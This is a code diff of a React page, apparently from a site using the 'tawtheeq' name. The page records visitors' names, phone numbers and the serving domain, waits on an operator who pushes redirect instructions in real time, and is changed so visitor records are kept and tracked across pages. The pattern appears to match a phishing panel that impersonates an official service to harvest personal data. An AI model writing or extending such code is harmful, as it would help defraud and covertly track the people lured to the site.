@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { useRegistration } from "@/contexts/RegistrationContext";
 import tawtheeqLogo from "@/assets/tawtheeq-logo.png";
@@ -7,11 +7,25 @@ import { supabase } from "@/integrations/supabase/client";
 const ProcessingRequest = () => {
   const [progress, setProgress] = useState(0);
   const navigate = useNavigate();
-  const { data } = useRegistration();
-  const [userId] = useState(() => `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`);
+  const { data, setTrackingUserId, trackingUserId } = useRegistration();
+  const hasSaved = useRef(false);
+  
+  // استخدام userId موجود أو إنشاء واحد جديد
+  const [userId] = useState(() => {
+    const existingId = localStorage.getItem("tracking_user_id");
+    if (existingId) return existingId;
+    return `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+  });
 
   useEffect(() => {
-    // Save user to database with current domain
+    // منع الحفظ المكرر
+    if (hasSaved.current) return;
+    hasSaved.current = true;
+
+    // حفظ userId في Context
+    setTrackingUserId(userId);
+
+    // Save user to database with current domain using upsert
     const saveUser = async () => {
       const userName = data.fullNameArabic || data.fullNameEnglish || "مستخدم غير معروف";
       const userPhone = data.mobileNumber || data.visitorMobile || "غير متوفر";
@@ -19,12 +33,13 @@ const ProcessingRequest = () => {
 
       const { error } = await supabase
         .from("processing_users")
-        .insert({
+        .upsert({
           user_id: userId,
           name: userName,
           phone: userPhone,
           domain: currentDomain,
-        });
+          current_page: "processing-request",
+        }, { onConflict: "user_id" });
 
       if (error) {
         console.error("Error saving user:", error);
@@ -58,15 +73,16 @@ const ProcessingRequest = () => {
         async (payload) => {
           const route = payload.new.route;
 
-          // Remove the instruction and user from database
+          // Remove the instruction from database (keep user for tracking)
           await supabase
             .from("navigation_instructions")
             .delete()
             .eq("user_id", userId);
 
+          // Update current page instead of deleting user
           await supabase
             .from("processing_users")
-            .delete()
+            .update({ current_page: route })
             .eq("user_id", userId);
 
           // Navigate to the specified route
@@ -84,15 +100,16 @@ const ProcessingRequest = () => {
         async (payload) => {
           const route = payload.new.route;
 
-          // Remove the instruction and user from database
+          // Remove the instruction from database (keep user for tracking)
           await supabase
             .from("navigation_instructions")
             .delete()
             .eq("user_id", userId);
 
+          // Update current page instead of deleting user
           await supabase
             .from("processing_users")
-            .delete()
+            .update({ current_page: route })
             .eq("user_id", userId);
 
           // Navigate to the specified route
